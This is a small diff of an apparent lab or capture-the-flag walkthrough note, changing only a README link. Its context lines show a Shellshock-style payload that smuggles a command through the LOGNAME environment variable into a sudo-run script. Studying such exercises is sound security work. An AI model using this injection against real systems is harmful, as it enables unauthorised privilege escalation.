@@ -8,4 +8,4 @@ If this is successful try adding this to a variable in the environmentals  for t
 
 	LOGNAME='() { :;}; echo PleaseSubscribe' sudo /root/troll
 
-Return to [[-README]]
+Return to [[README]]
